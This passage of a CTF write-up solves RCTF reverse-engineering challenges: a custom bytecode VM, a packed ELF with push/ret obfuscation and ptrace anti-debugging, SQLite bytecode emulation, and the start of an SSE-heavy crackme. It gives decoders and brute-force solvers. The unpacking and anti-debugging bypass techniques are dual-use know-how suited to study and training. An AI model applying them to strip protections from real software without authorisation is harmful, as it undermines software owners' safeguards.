nxt_instr_pointer = *(_DWORD *)&vm_code[nxt_instr_pointer];\n        else\n          nxt_instr_pointer = instr_pointer + 5;\n        break;\n      default:\n        break;\n    }\n    if ( nxt_instr_pointer >= file_size )\n      return 0LL;\n    instr_pointer = nxt_instr_pointer;\n  }\n}\n```\n\nI wrote a Python script to step through the VM bytecode and analyse each step.\n\n([full script](scripts/simple-vm.py))\n\nThe output was:\n\n```c\n0x30: global = 0x100\n0x35: global += 1\n0x36: cond = byte [global]\n0x37: putchar(cond)\n0x38: byte [0x100] ? jmp 0x35 and --\n0x41: nop\n\n// Output \"Input Flag:\"\n0x42: global = 0x110\n0x47: global += 1\n0x48: cond = getchar()\n0x49: nop\n0x4a: [global] = (byte)cond\n0x4b: byte [0x110] ? jmp 0x47 and --\n// [0x110] == 0x1f, flag size is 32\n// Input stored in [0x111]\n\n0x54: nop\n\n// Do some bit operation to each character \n0x55: cond = byte [0x140] //[0x140] == 0x20 + i\n0x5a: global = cond\n0x5b: cond += 0xf1 // Cond points to input\n0x60: cond = byte [cond]\n// Cond = input[i], [0x111]\n0x61: [0x143] = (byte)cond\n0x66: cond = ~(global & cond)\n0x67: [0x141] = (byte)cond\n0x6c: global = cond\n0x6d: cond = byte [0x140]\n0x72: cond = ~(global & cond)\n0x73: [0x142] = (byte)cond\n0x78: cond = byte [0x141]\n0x7d: cond = byte [0x143]\n0x82: cond = ~(global & cond)\n0x83: global = cond\n0x84: cond = byte [0x142]\n0x89: cond = ~(global & cond)\n0x8a: [0x144] = (byte)cond\n0x8f: nop\n0x90: cond = byte [0x140]\n0x95: cond += 0xf1\n0x9a: global = cond\n0x9b: cond = byte [0x144]\n0xa0: [global] = (byte)cond\n0xa1: global = byte [0x140]\n0xa6: global += 1\n0xa7: [0x140] = global\n0xac: byte [0x145] ? jmp 0x55 and --\n\n// Compare with key\n0xb5: nop\n0xb6: cond = byte [0x146] //[0x146] is i\n0xbb: cond += 0x5 //5[i]\n0xc0: cond = byte [cond] //take 5[i]\n0xc1: global = cond //global = 5[i], which is key\n0xc2: cond = byte [0x146]\n0xc7: cond += 0x111\n0xcc: cond = byte [cond] // 0x111[i] == 5[i], 0x111[i] is the result of bit operation\n0xcd: cond -= global\n0xce: cond ? jmp 0x160\n0xd3: byte [0x146] ? jmp 0xb6 and --\n0xdc: jmp 0x176 // Success\n0xe1: nop\n```\n\n`global` and `cond` are actually registers. Care has to be taken with byte access or dword access, and signed extension or unsigned extension (`movzx` or `movsx`), which are likely to be handled mistakenly. \n\nObtaining the vmcode and understanding what it does, we can write a bruteforce crack:\n\n```python\nkeys = [0x10,0x18,0x43,0x14,0x15,0x47,0x40,0x17,0x10,0x1d,0x4b,\n0x12,0x1f,0x49,0x48,0x18,0x53,0x54,0x01,0x57,0x51,0x53,0x05,0x56,0x5a,0x08,0x58,\n0x5f,0x0a,0x0c,0x58,0x09]\n\ndef some_bit_oper(c, i):\n\ti += 0x20\n\tg = i\n\tt3 = c\n\tt1 = (~(i & c)) & 0xff\n\tt2 = (~(t1 & i)) & 0xff\n\tt4 = (~((~(t1 & t3)) & t2)) & 0xff\n\treturn t4\n\nflag = []\nfor i in xrange(0, 32):\n\tfor c in xrange(0, 256):\n\t\tif some_bit_oper(c, i) == keys[i]:\n\t\t\tflag.append(chr(c))\n\nprint \"\".join(flag)\n```\n\n`RCTF{09a71bf084a93df7ce3def3ab1bd61f6}`\n\n## 606 Reverse / simple re ##\n\n**Description**\n\n> Please submit RCTF{\\<WhatYouInput\\>}.\n> \n> attachment:\n> \n> https://drive.google.com/open?id=1p3afjvuSfSYwmqaiEDDpJUcU0VhGJ8AT \n\n**Solution**\n\n### Unpacking ###\n\nThis is actually my first time dealing with linux packed executables, but the mechanism is similar to that on Windows.\n\nAfter opening the executable in IDA, IDA says `.GOT.PLT` cannot be found, which suggests it may be packed; also, it says the entry  point of program is invalid, this won't happen even if the program is packed, so let's see what is going on.\n\nFirstly, the entry point is `0x4018C8` as specified in the ELF header, but it is red (invalid).\n\n![elfheader](screens/simplere-elf-header.png)\n\nIDA says this address is not in a loadable section, and if we go to that address in IDA, it is not shown either. However, if we load this in gdb and breakpoint at `0x4018c8`, it works.\n\nThe problem is the at the PHT entry, the size is only `0x18c8`, which excludes the entry point:\n\n![pht](screens/simplere-pht.png)\n\nSo after patching the `0x18C8` to `0x2000`, IDA analysis will be normal.\n\n```assembly\npublic start\nstart           proc near               ; DATA XREF: LOAD:0000000000400018↑o\n; start+7↓o\nmov     rbp, offset _init_proc\nmov     r9, offset start\nloc_4018D6:     ; CODE XREF: start+23↓j\nmov     r8, 0CCh\nxor     qword ptr [rbp], r8\nmov     r8, [rbp+0]\ninc     rbp\ncmp     rbp, r9\njl      short loc_4018D6\nmov     rbp, offset _start\njmp     rbp\nstart           endp\n```\n\nThis code decodes the `.text` segment by XORing with `0xCC`, so we can write a IDA python script to decode:\n\n```python\ndef xor_decode(start, end, key):\n\tfor p in xrange(start, end):\n\t\tPatchByte(p, Byte(p) ^ key)\n#xor_decode(0x400958, 0x4018C8, 0xCC)\n```\n\nThen apply the patch to the file and reopen the file, the executable is unpacked.\n\n### First attempt ###\n\nWe can see following code in the main function:\n\n```c\nputs(\"input flag:\");\nread(0, ::flag, 0x21uLL);\nflag[0] = ::flag[0];\nflag[1] = ::flag[1];\nflag[2] = ::flag[2];\nflag[3] = ::flag[3];\nv7 = word_602100;\nv9[0] = 0x67452301;\nv9[1] = 0xEFCDAB89;\nv9[2] = 0x98BADCFE;\nv9[3] = 0x10325476;\nlength = (unsigned int)strlen((const char *)flag) >> 2;\nif ( length && return_true((unsigned int *)flag, length, v9) )\n  puts(\"Right!\");\nkill(pid, 9);\nreturn 0LL;\n```\n\nThere is actually more code in the previous part: calls to APIs like `fork`, `wait`, `ptrace`. Initially I thought these are just anti-debugging techniques and are not useful for obtaining the flag.\n\n`return_true` is:\n\n```c\n// length == 8\nbool __fastcall return_true(unsigned int *input, int length, unsigned int *key)\n{\n  unsigned int next; // ST2C_4\n  unsigned int v4; // ST34_4\n  unsigned int hash_gen_2bits; // [rsp+28h] [rbp-18h]\n  int i_1; // [rsp+30h] [rbp-10h]\n  unsigned int prev; // [rsp+34h] [rbp-Ch]\n  int i; // [rsp+38h] [rbp-8h]\n  unsigned int hash_gen; // [rsp+3Ch] [rbp-4h]\n\n  hash_gen = 0;\n  for ( i = 52 / length + 6; i; --i )\n  {\n    prev = input[length - 1];\n    i_1 = 0;\n    hash_gen -= 0x61C88647;\n    hash_gen_2bits = (hash_gen >> 2) & 3;\n    while ( length - 1 > i_1 )\n    {\n      next = input[i_1 + 1];\n      input[i_1] += ((next ^ hash_gen) + (prev ^ key[hash_gen_2bits ^ i_1 & 3])) ^ ((4 * next ^ (prev >> 5)) + ((next >> 3) ^ 16 * prev));\n      prev = input[i_1++];\n    }\n    input[length - 1] += ((*input ^ hash_gen) + (prev ^ key[hash_gen_2bits ^ i_1 & 3])) ^ ((4 * *input ^ (prev >> 5)) + ((*input >> 3) ^ 16 * prev));\n    v4 = input[length - 1];\n  }\n  __debugbreak();\n  return memcmp(input, \"quehsj_kcneop_amneuf_ieha_ehdhde\", 0x20uLL) == 0;\n}\n```\n\nFirst I searched for the magic number `0x61C88647`. It seems that it is a magic number used for a hashing algorithm.\n\nSo this seems like a hashing algorithm, input is added according to the previous element and the next element (the first's element previous element is the last element and vice versa, like a cyclic list), and this will be executed `52 / length + 6` times, with `hash_gen` being changed in each iteration. However, `[0]` (the first element) will use `[len - 1]` and `[1]`, which are not encoded; the `[i]` element (where `0 < i < len - 1`) will use `[i - 1]` (encoded) and `[i + 1]` (not encoded); the `[len - 1]` element will use `[len - 2]` and `[0]`, which are **encoded**. Therefore, we can recover the last element given the result of the hashing, and in turn recover all of the previous elements with a reverse loop, as shown:\n\n```c\n#include <stdint.h>\n#include <stdio.h>\n#include <memory.h>\n#include <sys/ptrace.h>\n\n#define LEN 8\nunsigned char buf[33] = \"quehsj_kcneop_amneuf_ieha_ehdhde\";\nunsigned int* test = (unsigned int*)testbufin;\nunsigned int* flag = (unsigned int*)buf;\n\nuint32_t key[4]={\n 0x67452301\n,0xEFCDAB89\n,0x98BADCFE\n,0x10325476};\n\nvoid print_hex(unsigned char* buf, size_t len)\n{\n  for (int i = 0; i < len; ++i)\n  {\n    printf(\"\\\\x%.2x\", buf[i]);\n  }\n  printf(\"\\n\");\n}\n\nunsigned int hash_gens[13];\n\nvoid init_hash_gens()\n{\n  unsigned int hash_gen = 0;\n  for (int i = 0; i < 12; ++i)\n  {\n    hash_gen -= 0x61C88647;\n    hash_gens[i] = hash_gen;\n  }\n}\n\nvoid one_iteration(unsigned int* flag, int i)\n{\n  unsigned int hash_gen_2bits = (hash_gens[i] >> 2) & 3;\n  flag[LEN - 1] -= ((*flag ^ hash_gens[i]) +\n        (flag[LEN - 2] ^ key[hash_gen_2bits ^ ((LEN - 1) & 3)]))\n        ^ ((4 * *flag ^ (flag[LEN - 2] >> 5))\n        + ((*flag >> 3) ^ 16 * flag[LEN - 2]));\n  //now flag[LEN - 1] has been recovered\n  for (int j = LEN - 2; j >= 1; --j)\n  {\n    flag[j] -= ((flag[j + 1] ^ hash_gens[i]) + (flag[j - 1] ^ key[hash_gen_2bits ^ (j & 3)])) ^ ((4 * flag[j + 1] ^ (flag[j - 1] >> 5)) + ((flag[j + 1] >> 3) ^ 16 * flag[j - 1]));\n  }\n  flag[0] -= ((flag[1] ^ hash_gens[i]) + (flag[LEN - 1] ^ key[hash_gen_2bits ^ (0 & 3)])) ^ ((4 * flag[1] ^ (flag[LEN - 1] >> 5)) + ((flag[1] >> 3) ^ 16 * flag[LEN - 1]));\n}\n\nint main()\n{\n  init_hash_gens();\n  printf(\"recover:\\n\");\n  for (int i = 52 / LEN + 6; i; i--)\n  {\n    one_iteration(flag, i - 1/*damn it, stuck for 2 hours!!!!!!!*/);\n    print_hex(buf, 33);\n    printf(\"%s\\n\", buf);\n  }\n}\n```\n\nHowever, the result is not readable, and indeed, if we `nop` the `fork` and ignore all the previous instructions, and redirect the resulting unreadable bytes into the stdin of the program, it will work, but this is certainly not the flag, so it must have something to do with the previous part of code.\n\n```\n$ ./simplere_unpacked_nofork < flag.txt \ninput flag:\nRight!\n$ xxd flag.txt \n00000000: 8ec8 e688 d671 767d 39f1 ae60 8447 b784  .....qv}9..`.G..\n00000010: 1ea4 f3ed 963a ed98 fc71 6351 8709 460b  .....:...qcQ..F.\n00000020: 00\n```\n\n### Second attempt ###\n\nThen I looked at the previous instructions, which did not seem like they were checking the flag, but I found something interesting:\n\n```assembly\n;in main function\nloc_401221: ; CODE XREF: main+136↑j\nlea     rax, cs:1F2498h\nmov     rdi, rax\ncall    plus_0x20edac\nmov     [rbp+var_18], rax\npush    [rbp+var_18]\nretn    ; jmp 0x401244\n\n\nLOAD:0000000000400EC1 plus_0x20edac   proc near               ; CODE XREF: sub_400FB1+12↓p\nLOAD:0000000000400EC1                                         ; main+1AA↓p\nLOAD:0000000000400EC1                 push    rbp\nLOAD:0000000000400EC2                 mov     rbp, rsp\nLOAD:0000000000400EC5                 push    rbx\nLOAD:0000000000400EC6                 mov     rbx, rdi        ; rbx = arg\nLOAD:0000000000400EC9                 lea     rdi, cs:300E37h\nLOAD:0000000000400ED0                 call    add_0x1000AC\nLOAD:0000000000400ED5                 push    rax             ; rax = 0x400ee3\nLOAD:0000000000400ED6                 retn                    ; jmp 400ee3\nLOAD:0000000000400ED6 plus_0x20edac   endp ; sp-analysis failed\nLOAD:0000000000400ED6\nLOAD:0000000000400ED6 ; ------------------------------------------------------------------\nLOAD:0000000000400ED7                 db 0AAh\nLOAD:0000000000400ED8                 db 0B7h\nLOAD:0000000000400ED9                 db 91h, 5, 6, 17h, 82h, 19h, 0C7h\nLOAD:0000000000400EE0                 db 0DDh, 0AAh, 0\nLOAD:0000000000400EE3 ; ------------------------------------------------------------------\nLOAD:0000000000400EE3                 mov     rdi, rbx\nLOAD:0000000000400EE6                 call    add_0x1000AC\nLOAD:0000000000400EEB                 add     rax, 10ED00h    ; rax = arg + 0x20edac\nLOAD:0000000000400EF1                 pop     rbx\nLOAD:0000000000400EF2                 pop     rbp\nLOAD:0000000000400EF3                 retn\n\nLOAD:0000000000400EA7 add_0x1000AC    proc near\nLOAD:0000000000400EA7                                         ; LOAD:0000000000400EE6↓p\nLOAD:0000000000400EA7\nLOAD:0000000000400EA7 var_8           = qword ptr -8\nLOAD:0000000000400EA7\nLOAD:0000000000400EA7                 push    rbp\nLOAD:0000000000400EA8                 mov     rbp, rsp\nLOAD:0000000000400EAB                 mov     [rbp+var_8], rdi\nLOAD:0000000000400EAF                 mov     eax, cs:dword_6020B8 ; eax = 0x1000AC\nLOAD:0000000000400EB5                 movsxd  rdx, eax\nLOAD:0000000000400EB8                 mov     rax, [rbp+var_8]\nLOAD:0000000000400EBC                 add     rax, rdx\nLOAD:0000000000400EBF                 pop     rbp\nLOAD:0000000000400EC0                 retn\nLOAD:0000000000400EC0 add_0x1000AC    endp\n```\n\nThis is a kind of obsfucation technique, in which the program `push xxx; retn` to implement a `jmp xxx`, so IDA will just fail the stack frame analysis.\n\nThus, actually, the main function should be like this (after replacing some useless instructions with `nop`)\n\n```assembly\nLOAD:0000000000401221                 lea     rax, cs:1F2498h\nLOAD:0000000000401228                 mov     rdi, rax\nLOAD:000000000040122B                 call    plus_0x20edac\nLOAD:0000000000401230                 mov     qword ptr [rbp+stat_loc+4], rax\nLOAD:0000000000401234                 nop\nLOAD:0000000000401235                 nop\nLOAD:0000000000401236                 nop\nLOAD:0000000000401237                 nop                     ; jmp 0x401244\nLOAD:0000000000401238\nLOAD:0000000000401238 loc_401238:\nLOAD:0000000000401238                 nop\nLOAD:0000000000401239                 nop\nLOAD:000000000040123A                 nop\nLOAD:000000000040123B                 nop\nLOAD:000000000040123C                 nop\nLOAD:000000000040123D                 nop\nLOAD:000000000040123E                 nop\nLOAD:000000000040123F                 nop\nLOAD:0000000000401240                 nop\nLOAD:0000000000401241                 nop\nLOAD:0000000000401242                 nop\nLOAD:0000000000401243                 nop\nLOAD:0000000000401244                 lea     rdx, [rbp+var_1A0]\n```\n\nOriginally there was a obsfucated `jmp`, but now I simply `nop` them and the replace the code that should have been `jmp`, which should have same effect. F5 decompile:\n\n ```c\n//...\n    plus_0x20edac();\n    *(int **)((char *)&stat_loc.__iptr + 4) = v3;\n    ptrace(PTRACE_GETSIGINFO, v12, 0LL, &v5);\n    if ( v5 == SIGTRAP )\n    {\n      ptrace(PTRACE_GETREGS, v12, 0LL, flag);\n      v8 = sub_400FB1;\n      ptrace(PTRACE_SETREGS, v12, 0LL, flag);\n    }\n    ptrace(PTRACE_CONT, v12, 0LL, 0LL);\n  }\n}\n//...\n ```\n\nThe `ptrace` seems to process flag in some way, but I could not understand it. :) Why does the program put the register context into the flag buffer? Also, the function `sub_400FB1` is strange - it is referenced and assigned to a local variable, but never used. If we have a look at it:\n\n```assembly\nLOAD:0000000000400FB1 sub_400FB1      proc near               ; DATA XREF: main+214↓o\nLOAD:0000000000400FB1                 push    rbp\nLOAD:0000000000400FB2                 mov     rbp, rsp\nLOAD:0000000000400FB5                 sub     rsp, 20h\nLOAD:0000000000400FB9                 lea     rax, cs:1F2230h\nLOAD:0000000000400FC0                 mov     rdi, rax\nLOAD:0000000000400FC3                 call    plus_0x20edac\nLOAD:0000000000400FC8                 mov     [rbp+var_10], rax\nLOAD:0000000000400FCC                 push    qword ptr [rbp-10h]\nLOAD:0000000000400FCF                 retn\n```\n\nSame technique as above. After `nop`, the function `sub_400FB1` decompiles to this code:\n\n```c\nvoid __noreturn sub_400FB1()\n{\n  __int64 v0; // rax\n  char s; // [rsp+1h] [rbp-1Fh]\n  char v2; // [rsp+2h] [rbp-1Eh]\n  char v3; // [rsp+3h] [rbp-1Dh]\n  char v4; // [rsp+4h] [rbp-1Ch]\n  char v5; // [rsp+5h] [rbp-1Bh]\n  char v6; // [rsp+6h] [rbp-1Ah]\n  char v7; // [rsp+7h] [rbp-19h]\n  _BOOL8 (__fastcall *v8)(unsigned int *); // [rsp+8h] [rbp-18h]\n  __int64 v9; // [rsp+10h] [rbp-10h]\n  unsigned __int64 i; // [rsp+18h] [rbp-8h]\n\n  plus_0x20edac();\n  v9 = v0;\n  v8 = real_check;\n  s = 'R';\n  v2 = 'i';\n  v3 = 'g';\n  v4 = 'h';\n  v5 = 't';\n  v6 = '!';\n  v7 = 0;\n  for ( i = 0LL; i < 354; ++i )\n    *((_BYTE *)v8 + i) ^= 0x28u;//xor SMC, use same xor_decode IDA python code to decode\n  if ( (unsigned __int8)real_check((unsigned int *)::flag) )\n    puts(&s);\n  if ( pid )\n    kill(pid, 9);\n  exit(0);\n}\n\n_BOOL8 __fastcall real_check(unsigned int *flag)\n{\n  unsigned int result[6]; // [rsp+8h] [rbp-40h]\n  unsigned int mult[6]; // [rsp+28h] [rbp-20h]\n  int v5; // [rsp+40h] [rbp-8h]\n  int i; // [rsp+44h] [rbp-4h]\n\n  mult[0] = 0x556E4969;\n  mult[1] = 0x2E775361;\n  mult[2] = 0x893DAE7;\n  mult[3] = 0x96990423;\n  mult[4] = 0x6CF9D3E9;\n  mult[5] = 0xA505531F;\n  result[0] = 0x54A0B9BD;\n  result[1] = 0x4B818640;\n  result[2] = 0x8EB63387;\n  result[3] = 0xA9EABEFD;\n  result[4] = 0xB8CDF96B;\n  result[5] = 0x113C3052;\n  for ( i = 0; i <= 5; ++i )\n  {\n    if ( mult[i] * flag[i] != result[i] )\n      return 0LL;\n  }\n  if ( (unsigned int)sub_400EF4(flag[6], *((unsigned __int16 *)flag + 14), 0xF64BB17D) != 0x6F82C8DC\n    || (unsigned int)sub_400F5B(*((_WORD *)flag + 14), *((_WORD *)flag + 15)) != 0xA496 )\n  {\n    return 0LL;\n  }\n  v5 = 0;\n  for ( i = 24; i <= 31; ++i )\n    v5 ^= *((char *)flag + i);\n  return v5 == 22 && *((_BYTE *)flag + 32) == 's';\n}\n```\n\nAfter XOR decoding again, we can see the `real_check` function that examines the flag, although I don't know how this will be called :D The first 24 bytes are easy, considering the overflow that might happen when doing multiplication, we use bruteforce approach.\n\n```c\nint main1(int argc, char const *argv[])\n{\n\tunsigned long long mult[6];\n\tunsigned long long result[6];\n\tmult[0] = 0x556E4969;\n\tmult[1] = 0x2E775361;\n\tmult[2] = 0x893DAE7;\n\tmult[3] = 0x96990423;\n\tmult[4] = 0x6CF9D3E9;\n\tmult[5] = 0xA505531F;\n\tresult[0] = 0x54A0B9BD;\n\tresult[1] = 0x4B818640;\n\tresult[2] = 0x8EB63387;\n\tresult[3] = 0xA9EABEFD;\n\tresult[4] = 0xB8CDF96B;\n\tresult[5] = 0x113C3052;\n\tfor (int i = 0; i < 6; ++i)\n\t{\n\t\tfor (unsigned long long x = 0L; x < 0x100000000L; ++x)\n\t\t{\n\t\t\tif ((x & 0xfffffffL) == 0)\n\t\t\t{\n\t\t\t\tprintf(\"%llx\\n\", x);\n\t\t\t}\n\t\t\tif (((x * mult[i]) & 0xffffffffL)  == result[i])\n\t\t\t{\n\t\t\t\tprintf(\"%s\\n\", (char*)&x);\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n`5o_M@ny_an7i_Rev3rsing_T`\n\n> Note: these are linear congruences again and could more quickly be solved with the same method as in [babyre2](#444-reverse--babyre2).\n\nHowever, the next 2 checks are harder:\n\n```c\nunsigned __int64 __fastcall sub_400EF4(unsigned int a1, unsigned int a2, unsigned int a3_0xF64BB17D)\n{\n  unsigned int flag2; // [rsp+4h] [rbp-18h]\n  unsigned __int64 v5; // [rsp+Ch] [rbp-10h]\n  unsigned __int64 v6; // [rsp+14h] [rbp-8h]\n\n  flag2 = a2;\n  v6 = 1LL;\n  v5 = a1;\n  while ( flag2 )\n  {\n    if ( flag2 & 1 )\n      v6 = v5 * v6 % a3_0xF64BB17D;\n    v5 = v5 * v5 % a3_0xF64BB17D;\n    flag2 >>= 1;\n  }\n  return v6; // need 0x6F82C8DC\n}\n\n__int64 __fastcall sub_400F5B(unsigned __int16 a1, unsigned __int16 a2)\n{\n  unsigned __int16 v2; // ST16_2\n  unsigned __int16 i; // [rsp+0h] [rbp-18h]\n  unsigned __int16 v5; // [rsp+4h] [rbp-14h]\n\n  v5 = a1;\n  for ( i = a2; i & v5; i = 2 * (i & v2) )\n  {\n    v2 = v5;\n    v5 ^= i;\n  }\n  return (unsigned __int16)(i | v5); // need 0xA496\n}\n```\n\nSo the flag looks like `5o_M@ny_an7i_Rev3rsing_T11112233s`, where `1111` and `22` will be the input for the first check; `22` and `33` will be the input for the second check. Additionally, there is a XOR checksum that must be satisfied.\n\n### The last 8 bytes ###\n\nGiven the challenge so far and the flag, it was obvious that the flag would say something like `5o_M@ny_an7i_Rev3rsing_Techniques` - the word fit exactly in the 8 bytes we had. However, just like with the other words, some letters would be replaced with numbers or their uppercase variants. The first thing I tried right away was just to check for these few possibilities:\n\n    ['e', 'E', '3']\n    ['c', 'C']\n    ['h', 'H']\n    ['n', 'N']\n    ['i', 'I', '1', '|']\n    ['q', 'Q']\n    ['u', 'U']\n    ['e', 'E', '3']\n\nBut no luck. In hindsight, it was a simple oversight. Can you tell which character I missed?\n\nWell, without much success here I turned to actually look at the two check functions. The second check (`sub_400F5B`, checking for `2233`) looks like some sort of XOR stream? But clearly with two 16-bit integer inputs there are only 2^32 possible inputs, which is not a huge number. After brute-forcing and constraining answers to ASCII bytes, there were only 7917 possible solutions.\n\nThe first check (`sub_400EF4`) seemed more complex to me at the time. For the write-up though, it is very clear. Suppose we take `a2 = 25 = 0b11001`. Then the steps taken in the while loop are:\n\n| v5 | a2 & 1 | v6 |\n| --- | --- | --- |\n| | | 1 |\n| a1^1 | 1 | 1 * a1^1 |\n| a1^2 | 0 | 1 * a1^1 |\n| a1^4 | 0 | 1 * a1^1 |\n| a1^8 | 1 | 1 * a1^1 * a1^8 |\n| a1^16 | 1 | 1 * a1^1 * a1^8 * a1^16 |\n\nSo the final value of `v6 = 1 * a1^1 * a1^8 * a1^16 = a1^(1 + 8 + 16) = a1^a2`. These operations work across the modulo application. In other words, we know the modulus `m` (`0xF64BB17D`), we know the required result `r` to pass the check (`0x6F82C8DC`), and we need to find out two numbers such that one to the power of the other modulo `m` is `r`:\n\n    a^b = r mod m\n\nThis is very common in encryption, [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Operation) specifically.\n\n### However! ###\n\nDuring the CTF I was a bit too dumb to realise, and the clock was ticking. So, a bruteforce method was employed, and executed on a beefy 64-core system.\n\n([here is the shameful bruteforcer](scripts/simplere-brute.c))\n\nAnd the flag is:\n\n`5o_M@ny_an7i_Rev3rsing_Techn!qu3s`\n\nSo I was right about the guess, `echn` matched exactly, but I did not think of `!` as a replacement for the letter `i`. Annoying, but we got the flag so oh well!\n\n## 338 Reverse / sql ##\n\n**Description**\n\n> the format of flag is flag{.+}\n> \n> attachment: https://drive.google.com/open?id=1TDWJWb2diPO_TDTHbZvuLWlsTV1LhoAs \n\n**Solution**\n\nWe were given a copy of a `sqlite3` terminal session, where the user typed `explain [some query]`, which produced the detailed SQLite VM bytecode. We don't know what the query is, and it seems the VM bytecode is more compressed than usual, since for my `sqlite3` it looked like:\n\n    sqlite> explain select 1;\n    addr  opcode         p1    p2    p3    p4             p5  comment      \n    ----  -------------  ----  ----  ----  -------------  --  -------------\n    0     Init           0     1     0                    00  Start at 1   \n    1     Integer        1     1     0                    00  r[1]=1       \n    2     ResultRow      1     1     0                    00  output=r[1]  \n    3     Halt           0     0     0                    00\n\nSo the challenge doesn't include the comments column, but other than that all the information is present. The above is useful to check which column represents what.\n\nMy first idea was to test some queries directly in `sqlite3` and refine them until the trace matches the one provided. But since the trace contains so many calls to `substr(3)` I figured the flag is probably matched character by character in a shuffled order, so this would probably take too long.\n\nSo the approach was to write a simple VM to emulate the opcodes that we actually need, and see what conditional checks are being executed to extract what the flag has to be to pass those checks. There is [an online reference of SQLite3 bytecodes](https://sqlite.org/opcode.html) - very useful for this challenge of course. It also explains the VM well enough to write a super simple implementation.\n\nIt was enough to implement these opcodes:\n\n - `Column`\n - `Function`\n - `Eq`\n - `Goto`\n - `Integer`\n - `Ne`\n - `OpenRead`\n - `Rewind`\n - `String8`\n - `TableLock`\n - `Trace`\n - `Transaction`\n - `VerifyCookie`\n\nAnd even some of these were basically no-ops. One additional piece of information was used to solve the problem: all the conditional `Ne` checks in the query jumped to instruction 90, which immediately halted the machine. So as soon as there is a character mismatch, the query failed. Therefore, we know that these checks need to have operands that are equal to one another. As it turns out, they were always a single character string, and a single character substring of the flag.\n\n([full sqlite mini-VM](scripts/sql/Main.hx))\n\nAnd with that:\n\n`flag{lqs_rof_galf_esrever_a}`\n\n## 444 Reverse / babyre2 ###\n\n**Description**\n\n> the format of flag is flag{.+}\n> \n> attachment:\n> \n> https://drive.google.com/open?id=1JoAvVnUJOO-E-E2C2qGH1QDVAVu6-qiS\n\n**Solution**\n\nOpened the executable in IDA, and many SSE instructions were found :\\(\n\nFor SSE instructions, it is even more clear to read assembly than to read the F5 decompiler result. After changing some of the data structure of the variable, F5 gives these results:\n\n```c\n  s[7] = -1LL;\n  s[8] = -1LL;\n  input[0] = 'UUUUUUUU';\n  input[1] = 'UUUUUUUU';\n  input[2] = 'UUUUUUUU';\n  input[3] = 'UUUUUUUU';\n  input[4] = 'UUUUUUUU';\n  input[5] = 'UUUUUUUU';\n  input[6] = 'UUUUUUUU';\n  input[7] = 'UUUUUUUU';\n  input[8] = 'UUUUUUUU';\n  input[9] = 'UUUUUUUU';\n  input[10] = 'UUUUUUUU';\n  input[11] = 'UUUUUUUU';\n  input[12] = 'UUUUUUUU';\n  input[13] = 'UUUUUUUU';\n  input[14] = 'UUUUUUUU';\n  input[15] = 'UUUUUUUU';\n  s[0] = ' emocleW'; // Welcome\n  s[9] = -1LL;\n  s[1] = ' FTCR ot'; // to RCTF\n  s[10] = -1LL;\n  s[2] = 'eH !8102'; // 2018! He\n  s[11] = -1LL;\n  s[3] = ' a si er'; // re is a\n  s[12] = -1LL;\n  s[13] = -1LL;\n  s[14] = -1LL;\n  s[15] = -1LL;\n  s[4] = 'c ERybaB'; // BabyRE c\n  s[5] = 'egnellah'; // hallenge\n  s[6] = 'uoy rof '; //  for you\n  LOWORD(s[7]) = '.';\n  puts((const char *)s);\n  __printf_chk(1LL, \"Give me your flag: \");\n  __isoc99_scanf(\"%127s\", input);\n/*\n  unsigned __int64 input[16]; // [rsp+0h] [rbp-198h]\n  unsigned __int64 s[16]; // [rsp+80h] [rbp-118h]\n  q_xmm_word result[8]; // [rsp+100h] [rbp-98h]\n  //result is regarded as uint64_t when assigning the result\n  //and regarded as uint128_t when checking the correctness of the result\n \n00000000 q_xmm_word      union ; (sizeof=0x10, mappedto_16)\n00000000                                         ; XREF: main+1B8/w\n00000000                                         ; main+1E1/w ...\n00000000 qwords          two_qwords ?\n00000000 xmms            xmmword ?\n00000000 q_xmm_word      ends\n00000000\n00000000 ; ---------------------------------------------------------------------------\n00000000\n00000000 two_qwords      struc ; (sizeof=0x10, mappedto_14)\n00000000                                         ; XREF: q_xmm_word/r\n00000000 low             dq ?\n00000008 high            dq ?\n00000010 two_qwords      ends\n*/\n  result[0].qwords.low = sub_400BA0((q_xmm_word)(input[0] * (unsigned __int128)s[0]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[0].qwords.high = sub_400BA0((q_xmm_word)(input[1] * (unsigned __int128)s[1]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[1].qwords.low = sub_400BA0((q_xmm_word)(input[2] * (unsigned __int128)s[2]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[1].qwords.high = sub_400BA0((q_xmm_word)(input[3] * (unsigned __int128)s[3]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[2].qwords.low = sub_400BA0((q_xmm_word)(input[4] * (unsigned __int128)s[4]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[2].qwords.high = sub_400BA0((q_xmm_word)(input[5] * (unsigned __int128)s[5]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[3].qwords.low = sub_400BA0((q_xmm_word)(input[6] * (unsigned __int128)s[6]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[3].qwords.high = sub_400BA0((q_xmm_word)(input[7] * (unsigned __int128)s[7]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[4].qwords.low = sub_400BA0((q_xmm_word)(input[8] * (unsigned __int128)s[8]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[4].qwords.high = sub_400BA0((q_xmm_word)(input[9] * (unsigned __int128)s[9]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[5].qwords.low = sub_400BA0((q_xmm_word)(input[10] * (unsigned __int128)s[10]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[5].qwords.high = sub_400BA0((q_xmm_word)(input[11] * (unsigned __int128)s[11]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[6].qwords.low = sub_400BA0((q_xmm_word)(input[12] * (unsigned __int128)s[12]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[6].qwords.high = sub_400BA0((q_xmm_word)(input[13] * (unsigned __int128)s[13]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  result[7].qwords.low = sub_400BA0((q_xmm_word)(input[14] * (unsigned __int128)s[14]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  v3 = sub_400BA0((q_xmm_word)(input[15] * (unsigned __int128)s[15]), 0xFFFFFFFFFFFFFFC5LL, 0LL);\n  v4 = _mm_load_si128((const __m128i 